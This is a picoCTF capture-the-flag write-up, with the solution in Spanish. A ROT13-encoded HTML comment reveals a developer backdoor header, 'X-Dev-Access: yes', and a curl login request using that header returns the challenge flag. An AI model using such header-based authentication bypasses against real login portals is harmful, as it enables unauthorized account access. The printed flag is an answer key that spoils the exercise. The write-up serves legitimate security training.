
We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: `ctf-player@picoctf.org`. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?

Additional details will be available after launching your challenge instance.

Hints:
- Developers sometimes leave notes in the code; but not always in plain text.
- A common trick is to rotate each letter by 13 positions in the alphabet.

## Solucion

- Vemos el código fuente
```
|   |
|---|
|<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->|
|<!-- Remove before pushing to production! -->|
```

- Rotamos el texto
```
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```
- Hacemos la solicitud con curl
```
curl -X POST http://amiable-citadel.picoctf.net:63747/login -H 'Content-Type: application/json' -H 'X-Dev-Access: yes' -d '{"email": "ctf-player@picoctf.org", "password": "hola"}'
{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_0d39383f}"}
```